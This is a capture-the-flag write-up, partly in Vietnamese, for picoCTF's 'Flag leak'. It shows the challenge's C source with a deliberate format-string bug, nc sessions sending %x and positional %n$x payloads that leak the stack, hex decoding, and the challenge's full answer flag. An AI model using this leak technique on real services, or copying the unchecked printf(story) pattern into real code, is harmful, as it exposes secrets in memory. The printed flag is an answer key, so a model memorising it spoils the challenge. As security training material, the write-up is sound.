## Flag leak
# Description:
Story telling class 1/2

I'm just copying and pasting with this `program`. What can go wrong? You can view source `here`. And connect with it using:

`nc saturn.picoctf.net 64250`

# Source 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
# Solution:
* Đầu tiên, ta biết được đây là file 32 bit
```
└─$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17bb7adc72aff4022d6a1c451eb9adcf34df2f8c, for GNU/Linux 3.2.0, not stripped
```
* Mở source lên và thấy format string ở dòng print(story).
* Thử nhập vào chuỗi `%x%x%x%x%x` và đúng như mong đợi, chương trình đã in ra các giá trị hex trong stack.
```
└─$ nc saturn.picoctf.net 64250
Tell me a story and then I'll tell you one >> %x%x%x%x%x
Here's a story -
ffccee60ffccee8080493467825782578257825
```

* Nhập vào chuỗi 127 kí tự %x để leak hết trong flag, ta thu được dãy hex:
```
└─$ nc saturn.picoctf.net 64078
Tell me a story and then I'll tell you one >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Here's a story -
ffead6c0.ffead6e0.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.
```
* Decode dãy này thì thu được flag gần hoàn chỉnh `ocip{FTCk43L_gn1g4lFff0_4tS_` (in ở dạng hex nên sẽ bị đảo 4 byte một, săp xếp lại ta được `picoCTF{L34k1ng_Fl4g_0ff_St4`). Vấn đề ở đây là dùng story và bị giới hạn độ dài chuỗi in ra nên sẽ không thể in ra hết các giá trị trong stack, nên ta tiếp tục leak những giá trị ở sau
```
└─$ nc saturn.picoctf.net 64078 
Tell me a story and then I'll tell you one >> %42$x.%43$x.%44$x.%45$x.%46$x.%47$x
Here's a story -
3474535f.395f6b63.32653939.7d343238.fbad2000.e9c41d00
```
* Decode và thu được phần cuối của flag `4tS_9_kc2e99}428` => `_St4ck_eb9b46a2}`

Flag hoàn chỉnh: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}` 
